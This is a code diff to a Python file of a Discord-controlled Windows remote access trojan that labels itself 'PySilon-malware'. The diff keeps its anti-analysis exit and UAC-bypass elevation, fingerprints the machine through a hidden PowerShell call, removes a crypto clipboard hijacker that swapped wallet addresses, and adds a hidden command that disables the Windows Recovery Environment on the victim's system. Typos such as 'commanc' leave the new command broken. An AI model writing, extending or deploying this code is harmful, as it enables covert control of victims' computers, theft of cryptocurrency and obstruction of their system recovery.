@@ -1,15 +1,15 @@
 import discord
 import os
+import ctypes
 import subprocess
 from discord.ext import commands
 import resources.modules.misc as pysilon_misc
 import resources.modules.protections as pysilon_protections
 import resources.modules.uac_bypass as uac_bypass
 from urllib.request import urlopen
-from resources.features.crypto_clipper import load_clipper_status, clipper_thread_stop, clipper_stop, match
-import threading
-import pyperclip
-import json
+
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
 
 if pysilon_protections.protection_check():
     os._exit(0)
@@ -17,7 +17,7 @@ if pysilon_protections.protection_check():
 if pysilon_protections.single_instance_lock():
     os._exit(0)
 
-if not uac_bypass.IsAdmin():
+if not IsAdmin():
     if uac_bypass.GetSelf()[1]:
         if uac_bypass.UACbypass():
             os._exit(0)
@@ -44,7 +44,7 @@ async def on_ready():
     guild_id_index = 0
     guild_id = guild_ids[guild_id_index]
 
-    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
+    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
     category_not_found = True
     break_loop = False
     for _ in guild_ids:
@@ -116,22 +116,6 @@ async def on_ready():
                 channel_ids['file'] = channel.id
             elif channel.name == 'Live microphone':
                 channel_ids['voice'] = channel.id
-    
-    clipper_status = load_clipper_status()
-    if clipper_status["status"] == "on":
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        config_path = os.path.join(script_dir, 'crypto_clipper.json')
-        with open(config_path) as f:
-            addresses = json.load(f)
-        
-        def wait_for_paste():
-            while not clipper_thread_stop:
-                while not clipper_stop:
-                    pyperclip.waitForNewPaste()
-                    match(addresses)
-
-        clipper_thread = threading.Thread(target=wait_for_paste)
-        clipper_thread.start()
 
 @client.event
 async def on_message(ctx):
@@ -161,5 +145,31 @@ async def delete_category(ctx,  argument=None, password=None):
         else: await ctx.send("```Invalid password! Cannot implode.```")
     else: 
         await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")
+
+@client.commanc(name="reset")
+async def reset_agentc_handler(ctx, argument=None):
+    if argument == "block":
+        await ctx.message.delete()
+        if IsAdmin():
+            subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
+            embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        else:
+            embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+    elif argument == "unblock":
+        await ctx.message.delete()
+        if IsAdmin():
+            subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
+            embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        else:
+            embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+    else: ctx.send("The **reset** command should be followed by **block** or ***unvloxk**")
 
 # [pysilon] commands
